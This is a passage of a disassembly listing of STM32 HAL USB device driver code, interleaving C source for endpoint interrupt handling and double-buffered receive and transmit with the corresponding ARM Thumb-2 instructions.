 8002c5a:	e002      	b.n	8002c62 <PCD_EP_ISR_Handler+0x720>
            }
            else
            {
              ep->xfer_len = 0U;
 8002c5c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c5e:	2200      	movs	r2, #0
 8002c60:	619a      	str	r2, [r3, #24]
            }

            /* Zero Length Packet? */
            if (ep->xfer_len == 0U)
 8002c62:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c64:	699b      	ldr	r3, [r3, #24]
 8002c66:	2b00      	cmp	r3, #0
 8002c68:	d106      	bne.n	8002c78 <PCD_EP_ISR_Handler+0x736>
            {
              /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
              hpcd->DataInStageCallback(hpcd, ep->num);
#else
              HAL_PCD_DataInStageCallback(hpcd, ep->num);
 8002c6a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c6c:	781b      	ldrb	r3, [r3, #0]
 8002c6e:	4619      	mov	r1, r3
 8002c70:	6878      	ldr	r0, [r7, #4]
 8002c72:	f009 fe46 	bl	800c902 <HAL_PCD_DataInStageCallback>
 8002c76:	e01b      	b.n	8002cb0 <PCD_EP_ISR_Handler+0x76e>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
            }
            else
            {
              /* Transfer is not yet Done */
              ep->xfer_buff += TxPctSize;
 8002c78:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c7a:	695a      	ldr	r2, [r3, #20]
 8002c7c:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 8002c80:	441a      	add	r2, r3
 8002c82:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c84:	615a      	str	r2, [r3, #20]
              ep->xfer_count += TxPctSize;
 8002c86:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c88:	69da      	ldr	r2, [r3, #28]
 8002c8a:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 8002c8e:	441a      	add	r2, r3
 8002c90:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c92:	61da      	str	r2, [r3, #28]
              (void)USB_EPStartXfer(hpcd->Instance, ep);
 8002c94:	687b      	ldr	r3, [r7, #4]
 8002c96:	681b      	ldr	r3, [r3, #0]
 8002c98:	6d79      	ldr	r1, [r7, #84]	; 0x54
 8002c9a:	4618      	mov	r0, r3
 8002c9c:	f003 fec3 	bl	8006a26 <USB_EPStartXfer>
 8002ca0:	e006      	b.n	8002cb0 <PCD_EP_ISR_Handler+0x76e>
          }
#if (USE_USB_DOUBLE_BUFFER == 1U)
          /* Double Buffer bulk IN (bulk transfer Len > Ep_Mps) */
          else
          {
            (void)HAL_PCD_EP_DB_Transmit(hpcd, ep, wEPVal);
 8002ca2:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002ca6:	461a      	mov	r2, r3
 8002ca8:	6d79      	ldr	r1, [r7, #84]	; 0x54
 8002caa:	6878      	ldr	r0, [r7, #4]
 8002cac:	f000 f917 	bl	8002ede <HAL_PCD_EP_DB_Transmit>
  while ((hpcd->Instance->ISTR & USB_ISTR_CTR) != 0U)
 8002cb0:	687b      	ldr	r3, [r7, #4]
 8002cb2:	681b      	ldr	r3, [r3, #0]
 8002cb4:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8002cb8:	b29b      	uxth	r3, r3
 8002cba:	b21b      	sxth	r3, r3
 8002cbc:	2b00      	cmp	r3, #0
 8002cbe:	f6ff ac45 	blt.w	800254c <PCD_EP_ISR_Handler+0xa>
        }
      }
    }
  }

  return HAL_OK;
 8002cc2:	2300      	movs	r3, #0
}
 8002cc4:	4618      	mov	r0, r3
 8002cc6:	3758      	adds	r7, #88	; 0x58
 8002cc8:	46bd      	mov	sp, r7
 8002cca:	bd80      	pop	{r7, pc}

08002ccc <HAL_PCD_EP_DB_Receive>:
  * @param  wEPVal Last snapshot of EPRx register value taken in ISR
  * @retval HAL status
  */
static uint16_t HAL_PCD_EP_DB_Receive(PCD_HandleTypeDef *hpcd,
                                      PCD_EPTypeDef *ep, uint16_t wEPVal)
{
 8002ccc:	b580      	push	{r7, lr}
 8002cce:	b088      	sub	sp, #32
 8002cd0:	af00      	add	r7, sp, #0
 8002cd2:	60f8      	str	r0, [r7, #12]
 8002cd4:	60b9      	str	r1, [r7, #8]
 8002cd6:	4613      	mov	r3, r2
 8002cd8:	80fb      	strh	r3, [r7, #6]
  uint16_t count;

  /* Manage Buffer0 OUT */
  if ((wEPVal & USB_EP_DTOG_RX) != 0U)
 8002cda:	88fb      	ldrh	r3, [r7, #6]
 8002cdc:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8002ce0:	2b00      	cmp	r3, #0
 8002ce2:	d07c      	beq.n	8002dde <HAL_PCD_EP_DB_Receive+0x112>
  {
    /* Get count of received Data on buffer0 */
    count = (uint16_t)PCD_GET_EP_DBUF0_CNT(hpcd->Instance, ep->num);
 8002ce4:	68fb      	ldr	r3, [r7, #12]
 8002ce6:	681b      	ldr	r3, [r3, #0]
 8002ce8:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002cec:	b29b      	uxth	r3, r3
 8002cee:	461a      	mov	r2, r3
 8002cf0:	68bb      	ldr	r3, [r7, #8]
 8002cf2:	781b      	ldrb	r3, [r3, #0]
 8002cf4:	00db      	lsls	r3, r3, #3
 8002cf6:	4413      	add	r3, r2
 8002cf8:	68fa      	ldr	r2, [r7, #12]
 8002cfa:	6812      	ldr	r2, [r2, #0]
 8002cfc:	4413      	add	r3, r2
 8002cfe:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002d02:	881b      	ldrh	r3, [r3, #0]
 8002d04:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002d08:	837b      	strh	r3, [r7, #26]

    if (ep->xfer_len >= count)
 8002d0a:	68bb      	ldr	r3, [r7, #8]
 8002d0c:	699a      	ldr	r2, [r3, #24]
 8002d0e:	8b7b      	ldrh	r3, [r7, #26]
 8002d10:	429a      	cmp	r2, r3
 8002d12:	d306      	bcc.n	8002d22 <HAL_PCD_EP_DB_Receive+0x56>
    {
      ep->xfer_len -= count;
 8002d14:	68bb      	ldr	r3, [r7, #8]
 8002d16:	699a      	ldr	r2, [r3, #24]
 8002d18:	8b7b      	ldrh	r3, [r7, #26]
 8002d1a:	1ad2      	subs	r2, r2, r3
 8002d1c:	68bb      	ldr	r3, [r7, #8]
 8002d1e:	619a      	str	r2, [r3, #24]
 8002d20:	e002      	b.n	8002d28 <HAL_PCD_EP_DB_Receive+0x5c>
    }
    else
    {
      ep->xfer_len = 0U;
 8002d22:	68bb      	ldr	r3, [r7, #8]
 8002d24:	2200      	movs	r2, #0
 8002d26:	619a      	str	r2, [r3, #24]
    }

    if (ep->xfer_len == 0U)
 8002d28:	68bb      	ldr	r3, [r7, #8]
 8002d2a:	699b      	ldr	r3, [r3, #24]
 8002d2c:	2b00      	cmp	r3, #0
 8002d2e:	d123      	bne.n	8002d78 <HAL_PCD_EP_DB_Receive+0xac>
    {
      /* set NAK to OUT endpoint since double buffer is enabled */
      PCD_SET_EP_RX_STATUS(hpcd->Instance, ep->num, USB_EP_RX_NAK);
 8002d30:	68fb      	ldr	r3, [r7, #12]
 8002d32:	681b      	ldr	r3, [r3, #0]
 8002d34:	461a      	mov	r2, r3
 8002d36:	68bb      	ldr	r3, [r7, #8]
 8002d38:	781b      	ldrb	r3, [r3, #0]
 8002d3a:	009b      	lsls	r3, r3, #2
 8002d3c:	4413      	add	r3, r2
 8002d3e:	881b      	ldrh	r3, [r3, #0]
 8002d40:	b29b      	uxth	r3, r3
 8002d42:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8002d46:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002d4a:	833b      	strh	r3, [r7, #24]
 8002d4c:	8b3b      	ldrh	r3, [r7, #24]
 8002d4e:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 8002d52:	833b      	strh	r3, [r7, #24]
 8002d54:	68fb      	ldr	r3, [r7, #12]
 8002d56:	681b      	ldr	r3, [r3, #0]
 8002d58:	461a      	mov	r2, r3
 8002d5a:	68bb      	ldr	r3, [r7, #8]
 8002d5c:	781b      	ldrb	r3, [r3, #0]
 8002d5e:	009b      	lsls	r3, r3, #2
 8002d60:	441a      	add	r2, r3
 8002d62:	8b3b      	ldrh	r3, [r7, #24]
 8002d64:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8002d68:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8002d6c:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8002d70:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8002d74:	b29b      	uxth	r3, r3
 8002d76:	8013      	strh	r3, [r2, #0]
    }

    /* Check if Buffer1 is in blocked state which requires to toggle */
    if ((wEPVal & USB_EP_DTOG_TX) != 0U)
 8002d78:	88fb      	ldrh	r3, [r7, #6]
 8002d7a:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8002d7e:	2b00      	cmp	r3, #0
 8002d80:	d01f      	beq.n	8002dc2 <HAL_PCD_EP_DB_Receive+0xf6>
    {
      PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 0U);
 8002d82:	68fb      	ldr	r3, [r7, #12]
 8002d84:	681b      	ldr	r3, [r3, #0]
 8002d86:	461a      	mov	r2, r3
 8002d88:	68bb      	ldr	r3, [r7, #8]
 8002d8a:	781b      	ldrb	r3, [r3, #0]
 8002d8c:	009b      	lsls	r3, r3, #2
 8002d8e:	4413      	add	r3, r2
 8002d90:	881b      	ldrh	r3, [r3, #0]
 8002d92:	b29b      	uxth	r3, r3
 8002d94:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8002d98:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002d9c:	82fb      	strh	r3, [r7, #22]
 8002d9e:	68fb      	ldr	r3, [r7, #12]
 8002da0:	681b      	ldr	r3, [r3, #0]
 8002da2:	461a      	mov	r2, r3
 8002da4:	68bb      	ldr	r3, [r7, #8]
 8002da6:	781b      	ldrb	r3, [r3, #0]
 8002da8:	009b      	lsls	r3, r3, #2
 8002daa:	441a      	add	r2, r3
 8002dac:	8afb      	ldrh	r3, [r7, #22]
 8002dae:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8002db2:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8002db6:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8002dba:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8002dbe:	b29b      	uxth	r3, r3
 8002dc0:	8013      	strh	r3, [r2, #0]
    }

    if (count != 0U)
 8002dc2:	8b7b      	ldrh	r3, [r7, #26]
 8002dc4:	2b00      	cmp	r3, #0
 8002dc6:	f000 8085 	beq.w	8002ed4 <HAL_PCD_EP_DB_Receive+0x208>
    {
      USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaaddr0, count);
 8002dca:	68fb      	ldr	r3, [r7, #12]
 8002dcc:	6818      	ldr	r0, [r3, #0]
 8002dce:	68bb      	ldr	r3, [r7, #8]
 8002dd0:	6959      	ldr	r1, [r3, #20]
 8002dd2:	68bb      	ldr	r3, [r7, #8]
 8002dd4:	891a      	ldrh	r2, [r3, #8]
 8002dd6:	8b7b      	ldrh	r3, [r7, #26]
 8002dd8:	f005 fb73 	bl	80084c2 <USB_ReadPMA>
 8002ddc:	e07a      	b.n	8002ed4 <HAL_PCD_EP_DB_Receive+0x208>
  }
  /* Manage Buffer 1 DTOG_RX=0 */
  else
  {
    /* Get count of received data */
    count = (uint16_t)PCD_GET_EP_DBUF1_CNT(hpcd->Instance, ep->num);
 8002dde:	68fb      	ldr	r3, [r7, #12]
 8002de0:	681b      	ldr	r3, [r3, #0]
 8002de2:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002de6:	b29b      	uxth	r3, r3
 8002de8:	461a      	mov	r2, r3
 8002dea:	68bb      	ldr	r3, [r7, #8]
 8002dec:	781b      	ldrb	r3, [r3, #0]
 8002dee:	00db      	lsls	r3, r3, #3
 8002df0:	4413      	add	r3, r2
 8002df2:	68fa      	ldr	r2, [r7, #12]
 8002df4:	6812      	ldr	r2, [r2, #0]
 8002df6:	4413      	add	r3, r2
 8002df8:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002dfc:	881b      	ldrh	r3, [r3, #0]
 8002dfe:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002e02:	837b      	strh	r3, [r7, #26]

    if (ep->xfer_len >= count)
 8002e04:	68bb      	ldr	r3, [r7, #8]
 8002e06:	699a      	ldr	r2, [r3, #24]
 8002e08:	8b7b      	ldrh	r3, [r7, #26]
 8002e0a:	429a      	cmp	r2, r3
 8002e0c:	d306      	bcc.n	8002e1c <HAL_PCD_EP_DB_Receive+0x150>
    {
      ep->xfer_len -= count;
 8002e0e:	68bb      	ldr	r3, [r7, #8]
 8002e10:	699a      	ldr	r2, [r3, #24]
 8002e12:	8b7b      	ldrh	r3, [r7, #26]
 8002e14:	1ad2      	subs	r2, r2, r3
 8002e16:	68bb      	ldr	r3, [r7, #8]
 8002e18:	619a      	str	r2, [r3, #24]
 8002e1a:	e002      	b.n	8002e22 <HAL_PCD_EP_DB_Receive+0x156>
    }
    else
    {
      ep->xfer_len = 0U;
 8002e1c:	68bb      	ldr	r3, [r7, #8]
 8002e1e:	2200      	movs	r2, #0
 8002e20:	619a      	str	r2, [r3, #24]
    }

    if (ep->xfer_len == 0U)
 8002e22:	68bb      	ldr	r3, [r7, #8]
 8002e24:	699b      	ldr	r3, [r3, #24]
 8002e26:	2b00      	cmp	r3, #0
 8002e28:	d123      	bne.n	8002e72 <HAL_PCD_EP_DB_Receive+0x1a6>
    {
      /* set NAK on the current endpoint */
      PCD_SET_EP_RX_STATUS(hpcd->Instance, ep->num, USB_EP_RX_NAK);
 8002e2a:	68fb      	ldr	r3, [r7, #12]
 8002e2c:	681b      	ldr	r3, [r3, #0]
 8002e2e:	461a      	mov	r2, r3
 8002e30:	68bb      	ldr	r3, [r7, #8]
 8002e32:	781b      	ldrb	r3, [r3, #0]
 8002e34:	009b      	lsls	r3, r3, #2
 8002e36:	4413      	add	r3, r2
 8002e38:	881b      	ldrh	r3, [r3, #0]
 8002e3a:	b29b      	uxth	r3, r3
 8002e3c:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8002e40:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002e44:	83fb      	strh	r3, [r7, #30]
 8002e46:	8bfb      	ldrh	r3, [r7, #30]
 8002e48:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 8002e4c:	83fb      	strh	r3, [r7, #30]
 8002e4e:	68fb      	ldr	r3, [r7, #12]
 8002e50:	681b      	ldr	r3, [r3, #0]
 8002e52:	461a      	mov	r2, r3
 8002e54:	68bb      	ldr	r3, [r7, #8]
 8002e56:	781b      	ldrb	r3, [r3, #0]
 8002e58:	009b      	lsls	r3, r3, #2
 8002e5a:	441a      	add	r2, r3
 8002e5c:	8bfb      	ldrh	r3, [r7, #30]
 8002e5e:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8002e62:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8002e66:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8002e6a:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8002e6e:	b29b      	uxth	r3, r3
 8002e70:	8013      	strh	r3, [r2, #0]
    }

    /*Need to FreeUser Buffer*/
    if ((wEPVal & USB_EP_DTOG_TX) == 0U)
 8002e72:	88fb      	ldrh	r3, [r7, #6]
 8002e74:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8002e78:	2b00      	cmp	r3, #0
 8002e7a:	d11f      	bne.n	8002ebc <HAL_PCD_EP_DB_Receive+0x1f0>
    {
      PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 0U);
 8002e7c:	68fb      	ldr	r3, [r7, #12]
 8002e7e:	681b      	ldr	r3, [r3, #0]
 8002e80:	461a      	mov	r2, r3
 8002e82:	68bb      	ldr	r3, [r7, #8]
 8002e84:	781b      	ldrb	r3, [r3, #0]
 8002e86:	009b      	lsls	r3, r3, #2
 8002e88:	4413      	add	r3, r2
 8002e8a:	881b      	ldrh	r3, [r3, #0]
 8002e8c:	b29b      	uxth	r3, r3
 8002e8e:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8002e92:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002e96:	83bb      	strh	r3, [r7, #28]
 8002e98:	68fb      	ldr	r3, [r7, #12]
 8002e9a:	681b      	ldr	r3, [r3, #0]
 8002e9c:	461a      	mov	r2, r3
 8002e9e:	68bb      	ldr	r3, [r7, #8]
 8002ea0:	781b      	ldrb	r3, [r3, #0]
 8002ea2:	009b      	lsls	r3, r3, #2
 8002ea4:	441a      	add	r2, r3
 8002ea6:	8bbb      	ldrh	r3, [r7, #28]
 8002ea8:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8002eac:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8002eb0:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8002eb4:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8002eb8:	b29b      	uxth	r3, r3
 8002eba:	8013      	strh	r3, [r2, #0]
    }

    if (count != 0U)
 8002ebc:	8b7b      	ldrh	r3, [r7, #26]
 8002ebe:	2b00      	cmp	r3, #0
 8002ec0:	d008      	beq.n	8002ed4 <HAL_PCD_EP_DB_Receive+0x208>
    {
      USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaaddr1, count);
 8002ec2:	68fb      	ldr	r3, [r7, #12]
 8002ec4:	6818      	ldr	r0, [r3, #0]
 8002ec6:	68bb      	ldr	r3, [r7, #8]
 8002ec8:	6959      	ldr	r1, [r3, #20]
 8002eca:	68bb      	ldr	r3, [r7, #8]
 8002ecc:	895a      	ldrh	r2, [r3, #10]
 8002ece:	8b7b      	ldrh	r3, [r7, #26]
 8002ed0:	f005 faf7 	bl	80084c2 <USB_ReadPMA>
    }
  }

  return count;
 8002ed4:	8b7b      	ldrh	r3, [r7, #26]
}
 8002ed6:	4618      	mov	r0, r3
 8002ed8:	3720      	adds	r7, #32
 8002eda:	46bd      	mov	sp, r7
 8002edc:	bd80      	pop	{r7, pc}

08002ede <HAL_PCD_EP_DB_Transmit>:
  * @param  wEPVal Last snapshot of EPRx register value taken in ISR
  * @retval HAL status
  */
static HAL_StatusTypeDef HAL_PCD_EP_DB_Transmit(PCD_HandleTypeDef *hpcd,
                                                PCD_EPTypeDef *ep, uint16_t wEPVal)
{
 8002ede:	b580      	push	{r7, lr}
 8002ee0:	b0a4      	sub	sp, #144	; 0x90
 8002ee2:	af00      	add	r7, sp, #0
 8002ee4:	60f8      	str	r0, [r7, #12]
 8002ee6:	60b9      	str	r1, [r7, #8]
 8002ee8:	4613      	mov	r3, r2
 8002eea:	80fb      	strh	r3, [r7, #6]
  uint32_t len;
  uint16_t TxPctSize;

  /* Data Buffer0 ACK received */
  if ((wEPVal & USB_EP_DTOG_TX) != 0U)
 8002eec:	88fb      	ldrh	r3, [r7, #6]
 8002eee:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8002ef2:	2b00      	cmp	r3, #0
 8002ef4:	f000 81db 	beq.w	80032ae <HAL_PCD_EP_DB_Transmit+0x3d0>
  {
    /* multi-packet on the NON control IN endpoint */
    TxPctSize = (uint16_t)PCD_GET_EP_DBUF0_CNT(hpcd->Instance, ep->num);
 8002ef8:	68fb      	ldr	r3, [r7, #12]
 8002efa:	681b      	ldr	r3, [r3, #0]
 8002efc:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002f00:	b29b      	uxth	r3, r3
 8002f02:	461a      	mov	r2, r3
 8002f04:	68bb      	ldr	r3, [r7, #8]
 8002f06:	781b      	ldrb	r3, [r3, #0]
 8002f08:	00db      	lsls	r3, r3, #3
 8002f0a:	4413      	add	r3, r2
 8002f0c:	68fa      	ldr	r2, [r7, #12]
 8002f0e:	6812      	ldr	r2, [r2, #0]
 8002f10:	4413      	add	r3, r2
 8002f12:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002f16:	881b      	ldrh	r3, [r3, #0]
 8002f18:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002f1c:	f8a7 3086 	strh.w	r3, [r7, #134]	; 0x86

    if (ep->xfer_len > TxPctSize)
 8002f20:	68bb      	ldr	r3, [r7, #8]
 8002f22:	699a      	ldr	r2, [r3, #24]
 8002f24:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 8002f28:	429a      	cmp	r2, r3
 8002f2a:	d907      	bls.n	8002f3c <HAL_PCD_EP_DB_Transmit+0x5e>
    {
      ep->xfer_len -= TxPctSize;
 8002f2c:	68bb      	ldr	r3, [r7, #8]
 8002f2e:	699a      	ldr	r2, [r3, #24]
 8002f30:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 8002f34:	1ad2      	subs	r2, r2, r3
 8002f36:	68bb      	ldr	r3, [r7, #8]
 8002f38:	619a      	str	r2, [r3, #24]
 8002f3a:	e002      	b.n	8002f42 <HAL_PCD_EP_DB_Transmit+0x64>
    }
    else
    {
      ep->xfer_len = 0U;
 8002f3c:	68bb      	ldr	r3, [r7, #8]
 8002f3e:	2200      	movs	r2, #0
 8002f40:	619a      	str	r2, [r3, #24]
    }

    /* Transfer is completed */
    if (ep->xfer_len == 0U)
 8002f42:	68bb      	ldr	r3, [r7, #8]
 8002f44:	699b      	ldr	r3, [r3, #24]
 8002f46:	2b00      	cmp	r3, #0
 8002f48:	f040 80b9 	bne.w	80030be <HAL_PCD_EP_DB_Transmit+0x1e0>
    {
      PCD_SET_EP_DBUF0_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 8002f4c:	68bb      	ldr	r3, [r7, #8]
 8002f4e:	785b      	ldrb	r3, [r3, #1]
 8002f50:	2b00      	cmp	r3, #0
 8002f52:	d126      	bne.n	8002fa2 <HAL_PCD_EP_DB_Transmit+0xc4>
 8002f54:	68fb      	ldr	r3, [r7, #12]
 8002f56:	681b      	ldr	r3, [r3, #0]
 8002f58:	62fb      	str	r3, [r7, #44]	; 0x2c
 8002f5a:	68fb      	ldr	r3, [r7, #12]
 8002f5c:	681b      	ldr	r3, [r3, #0]
 8002f5e:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002f62:	b29b      	uxth	r3, r3
 8002f64:	461a      	mov	r2, r3
 8002f66:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8002f68:	4413      	add	r3, r2
 8002f6a:	62fb      	str	r3, [r7, #44]	; 0x2c
 8002f6c:	68bb      	ldr	r3, [r7, #8]
 8002f6e:	781b      	ldrb	r3, [r3, #0]
 8002f70:	00da      	lsls	r2, r3, #3
 8002f72:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8002f74:	4413      	add	r3, r2
 8002f76:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002f7a:	62bb      	str	r3, [r7, #40]	; 0x28
 8002f7c:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8002f7e:	881b      	ldrh	r3, [r3, #0]
 8002f80:	b29b      	uxth	r3, r3
 8002f82:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002f86:	b29a      	uxth	r2, r3
 8002f88:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8002f8a:	801a      	strh	r2, [r3, #0]
 8002f8c:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8002f8e:	881b      	ldrh	r3, [r3, #0]
 8002f90:	b29b      	uxth	r3, r3
 8002f92:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002f96:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002f9a:	b29a      	uxth	r2, r3
 8002f9c:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8002f9e:	801a      	strh	r2, [r3, #0]
 8002fa0:	e01a      	b.n	8002fd8 <HAL_PCD_EP_DB_Transmit+0xfa>
 8002fa2:	68bb      	ldr	r3, [r7, #8]
 8002fa4:	785b      	ldrb	r3, [r3, #1]
 8002fa6:	2b01      	cmp	r3, #1
 8002fa8:	d116      	bne.n	8002fd8 <HAL_PCD_EP_DB_Transmit+0xfa>
 8002faa:	68fb      	ldr	r3, [r7, #12]
 8002fac:	681b      	ldr	r3, [r3, #0]
 8002fae:	637b      	str	r3, [r7, #52]	; 0x34
 8002fb0:	68fb      	ldr	r3, [r7, #12]
 8002fb2:	681b      	ldr	r3, [r3, #0]
 8002fb4:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002fb8:	b29b      	uxth	r3, r3
 8002fba:	461a      	mov	r2, r3
 8002fbc:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8002fbe:	4413      	add	r3, r2
 8002fc0:	637b      	str	r3, [r7, #52]	; 0x34
 8002fc2:	68bb      	ldr	r3, [r7, #8]
 8002fc4:	781b      	ldrb	r3, [r3, #0]
 8002fc6:	00da      	lsls	r2, r3, #3
 8002fc8:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8002fca:	4413      	add	r3, r2
 8002fcc:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002fd0:	633b      	str	r3, [r7, #48]	; 0x30
 8002fd2:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8002fd4:	2200      	movs	r2, #0
 8002fd6:	801a      	strh	r2, [r3, #0]
      PCD_SET_EP_DBUF1_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 8002fd8:	68fb      	ldr	r3, [r7, #12]
 8002fda:	681b      	ldr	r3, [r3, #0]
 8002fdc:	627b      	str	r3, [r7, #36]	; 0x24
 8002fde:	68bb      	ldr	r3, [r7, #8]
 8002fe0:	785b      	ldrb	r3, [r3, #1]
 8002fe2:	2b00      	cmp	r3, #0
 8002fe4:	d126      	bne.n	8003034 <HAL_PCD_EP_DB_Transmit+0x156>
 8002fe6:	68fb      	ldr	r3, [r7, #12]
 8002fe8:	681b      	ldr	r3, [r3, #0]
 8002fea:	61fb      	str	r3, [r7, #28]
 8002fec:	68fb      	ldr	r3, [r7, #12]
 8002fee:	681b      	ldr	r3, [r3, #0]
 8002ff0:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002ff4:	b29b      	uxth	r3, r3
 8002ff6:	461a      	mov	r2, r3
 8002ff8:	69fb      	ldr	r3, [r7, #28]
 8002ffa:	4413      	add	r3, r2
 8002ffc:	61fb      	str	r3, [r7, #28]
 8002ffe:	68bb      	ldr	r3, [r7, #8]
 8003000:	781b      	ldrb	r3, [r3, #0]
 8003002:	00da      	lsls	r2, r3, #3
 8003004:	69fb      	ldr	r3, [r7, #28]
 8003006:	4413      	add	r3, r2
 8003008:	f203 4306 	addw	r3, r3, #1030	; 0x406
 800300c:	61bb      	str	r3, [r7, #24]
 800300e:	69bb      	ldr	r3, [r7, #24]
 8003010:	881b      	ldrh	r3, [r3, #0]
 8003012:	b29b      	uxth	r3, r3
 8003014:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8003018:	b29a      	uxth	r2, r3
 800301a:	69bb      	ldr	r3, [r7, #24]
 800301c:	801a      	strh	r2, [r3, #0]
 800301e:	69bb      	ldr	r3, [r7, #24]
 8003020:	881b      	ldrh	r3, [r3, #0]
 8003022:	b29b      	uxth	r3, r3
 8003024:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8003028:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800302c:	b29a      	uxth	r2, r3
 800302e:	69bb      	ldr	r3, [r7, #24]
 8003030:	801a      	strh	r2, [r3, #0]
 8003032:	e017      	b.n	8003064 <HAL_PCD_EP_DB_Transmit+0x186>
 8003034:	68bb      	ldr	r3, [r7, #8]
 8003036:	785b      	ldrb	r3, [r3, #1]
 8003038:	2b01      	cmp	r3, #1
 800303a:	d113      	bne.n	8003064 <HAL_PCD_EP_DB_Transmit+0x186>
 800303c:	68fb      	ldr	r3, [r7, #12]
 800303e:	681b      	ldr	r3, [r3, #0]
 8003040:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8003044:	b29b      	uxth	r3, r3
 8003046:	461a      	mov	r2, r3
 8003048:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 800304a:	4413      	add	r3, r2
 800304c:	627b      	str	r3, [r7, #36]	; 0x24
 800304e:	68bb      	ldr	r3, [r7, #8]
 8003050:	781b      	ldrb	r3, [r3, #0]
 8003052:	00da      	lsls	r2, r3, #3
 8003054:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8003056:	4413      	add	r3, r2
 8003058:	f203 4306 	addw	r3, r3, #1030	; 0x406
 800305c:	623b      	str	r3, [r7, #32]
 800305e:	6a3b      	ldr	r3, [r7, #32]
 8003060:	2200      	movs	r2, #0
 8003062:	801a      	strh	r2, [r3, #0]

      /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
      hpcd->DataInStageCallback(hpcd, ep->num);
#else
      HAL_PCD_DataInStageCallback(hpcd, ep->num);
 8003064:	68bb      	ldr	r3, [r7, #8]
 8003066:	781b      	ldrb	r3, [r3, #0]
 8003068:	4619      	mov	r1, r3
 800306a:	68f8      	ldr	r0, [r7, #12]
 800306c:	f009 fc49 	bl	800c902 <HAL_PCD_DataInStageCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

      if ((wEPVal & USB_EP_DTOG_RX) != 0U)
 8003070:	88fb      	ldrh	r3, [r7, #6]
